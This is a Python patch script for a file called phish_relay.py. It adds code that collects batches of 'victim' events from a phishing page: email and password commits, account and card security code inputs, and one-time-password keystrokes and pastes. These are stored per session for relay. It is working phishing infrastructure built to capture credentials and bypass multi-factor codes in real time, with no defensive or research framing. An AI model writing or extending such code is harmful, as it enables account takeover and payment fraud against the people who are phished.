"""Patch harbor_run phish_relay.py for victim Continue batch {events:[]}."""
from pathlib import Path

RELAY = Path(__file__).with_name("phish_relay.py")
text = RELAY.read_text(encoding="utf-8")
if 'batch = body.get("events")' in text:
    print("already patched")
    raise SystemExit(0)

INGEST = '''

def ingest_event(st: SessionState, ev: dict) -> None:
    if ev.get("type") == "email-commit":
        replaced = False
        for i in range(len(st.events) - 1, -1, -1):
            prev = st.events[i]
            if prev.get("type") != "email-commit":
                continue
            if int(ev.get("seq") or 0) >= int(prev.get("seq") or 0):
                st.events[i] = ev
            replaced = True
            break
        if not replaced:
            st.events.append(ev)
        while len(st.events) > MAX_EVENTS:
            st.events.popleft()
        return
    if ev.get("type") == "password-commit":
        replaced = False
        for i in range(len(st.events) - 1, -1, -1):
            prev = st.events[i]
            if prev.get("type") != "password-commit":
                continue
            if int(ev.get("seq") or 0) >= int(prev.get("seq") or 0):
                st.events[i] = ev
            replaced = True
            break
        if not replaced:
            st.events.append(ev)
        while len(st.events) > MAX_EVENTS:
            st.events.popleft()
        return
    if ev.get("type") == "input":
        field = (ev.get("payload") or {}).get("field")
        if field in ("account", "password", "payment-csc"):
            replaced = False
            for i in range(len(st.events) - 1, -1, -1):
                prev = st.events[i]
                if prev.get("type") != "input":
                    continue
                if (prev.get("payload") or {}).get("field") != field:
                    continue
                if _should_replace_input(prev, ev):
                    st.events[i] = ev
                replaced = True
                break
            if not replaced:
                st.events.append(ev)
            while len(st.events) > MAX_EVENTS:
                st.events.popleft()
            return
    if ev.get("type") == "otp-input":
        payload = ev.get("payload") or {}
        idx = str(payload.get("index", payload.get("i", 0)))
        replaced = False
        for i in range(len(st.events) - 1, -1, -1):
            prev = st.events[i]
            if prev.get("type") != "otp-input":
                continue
            p2 = prev.get("payload") or {}
            if str(p2.get("index", p2.get("i", 0))) != idx:
                continue
            if _should_replace_input(prev, ev):
                st.events[i] = ev
            replaced = True
            break
        if not replaced:
            st.events.append(ev)
        while len(st.events) > MAX_EVENTS:
            st.events.popleft()
        return
    if ev.get("type") == "otp-paste":
        for i in range(len(st.events) - 1, -1, -1):
            if st.events[i].get("type") == "otp-paste":
                if _should_replace_input(st.events[i], ev):
                    st.events[i] = ev
                return
        st.events.append(ev)
        while len(st.events) > MAX_EVENTS:
            st.events.popleft()
        return
    st.events.append(ev)
    while len(st.events) > MAX_EVENTS:
        st.events.popleft()


'''

NEW_POST = '''async def post_event(request: web.Request) -> web.Response:
    try:
        body = await request.json()
    except json.JSONDecodeError:
        return cors(web.json_response({"ok": False, "error": "json"}, status=400))
    sid = str(body.get("session") or "default")
    batch = body.get("events")
    if isinstance(batch, list) and batch:
        st = _session(sid)
        n = 0
        for ev in batch:
            if isinstance(ev, dict):
                ingest_event(st, ev)
                n += 1
        return cors(web.json_response({"ok": True, "n": n}))
    ev = body.get("event")
    if not isinstance(ev, dict):
        return cors(web.json_response({"ok": False, "error": "event"}, status=400))
    st = _session(sid)
    ingest_event(st, ev)
    return cors(web.json_response({"ok": True}))


'''

marker = "async def post_event(request: web.Request)"
idx = text.find(marker)
if idx < 0:
    raise SystemExit("post_event not found")
end = text.find("\nasync def drain_events", idx)
if end < 0:
    raise SystemExit("drain_events not found")
if "def ingest_event" not in text:
    text = text.replace(
        "async def post_event(request: web.Request)",
        INGEST.strip() + "\n\n\nasync def post_event(request: web.Request)",
        1,
    )
    idx = text.find(marker)
    end = text.find("\nasync def drain_events", idx)
text = text[:idx] + NEW_POST + text[end + 1 :]
RELAY.write_text(text, encoding="utf-8")
print("patched", RELAY.stat().st_size)
